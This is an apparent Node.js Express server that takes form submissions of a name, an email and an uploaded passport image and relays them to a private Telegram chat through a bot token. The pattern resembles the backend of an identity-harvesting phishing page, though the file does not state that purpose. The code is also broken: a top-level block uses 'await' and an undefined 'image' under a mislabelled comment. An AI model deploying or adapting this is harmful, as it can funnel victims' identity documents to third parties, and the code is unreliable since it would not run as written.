const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');
const path = require('path');
const axios = require('axios');
const multer = require ('multer');
const FormData = require('form-data');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000; 

app.use(cors());
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// Serve static files from React/Vue/HTML frontend if you have one
app.use(express.static(path.join(__dirname, 'public')));

// API Routes
app.get('/api/data', (req, res) => {
    res.json({ message: 'Hello from Render server!' });
});

// Minimal multer configuration - just for file storage
const upload = multer({
    dest: 'uploads/', });

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

// Function to send image to Telegram
if (image) {
            const formData = new FormData();
            formData.append('chat_id', TELEGRAM_CHAT_ID);
            formData.append('photo', fs.createReadStream(image.path));
            await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, formData, {
                headers: formData.getHeaders()
            });
            fs.unlinkSync(image.path); // Cleanup
        }

// Function to send message to Telegram
async function sendToTelegram(message) {
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        
        const response = await axios.post(url, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        });
        
        return { success: true, data: response.data };
    } catch (error) {
        console.error('Error sending to Telegram:', error.response?.data || error.message);
        return { success: false, error: error.response?.data || error.message };
    }
}

// Route to handle form submission
app.post('/api/data', upload.single('passport'), async (req, res) => {
    try {
        const { name, email } = req.body;
        const image = req.file;
        
        // Validate required fields
        if (!name || !email) {
            return res.status(400).json({
                error: 'All fields are required'
            });
        }
        // Image to telegram
        if (image) {
            const formData = new FormData();
            formData.append('chat_id', TELEGRAM_CHAT_ID);
            formData.append('photo', fs.createReadStream(image.path));
            await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, formData, {
                headers: formData.getHeaders()
            });
            fs.unlinkSync(image.path); // Cleanup
        }
        
        // Format message for Telegram
        const telegramMessage = `
📧 <b>New Form Submission</b>

👤 <b>Name:</b> ${name}
📧 <b>Email:</b> ${email}


⏰ <i>Received at: ${new Date().toLocaleString()}</i>
        `.trim();
        
        // Send to Telegram
        const result = await sendToTelegram(telegramMessage);
        
        if (result.success) {
            res.json({
                success: true,
                message: 'Message sent to Telegram successfully'
            });
        } else {
            res.status(500).json({
                error: 'Failed to send message to Telegram',
                details: result.error
            });
        }
        
    } catch (error) {
        console.error('Server error:', error);
        res.status(500).json({
            error: 'Internal server error'
        });
    }
});

// Health check route
app.get('/', (req, res) => {
    res.json({ message: 'Telegram Bot Server is running!' });
});

  
// Start server
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
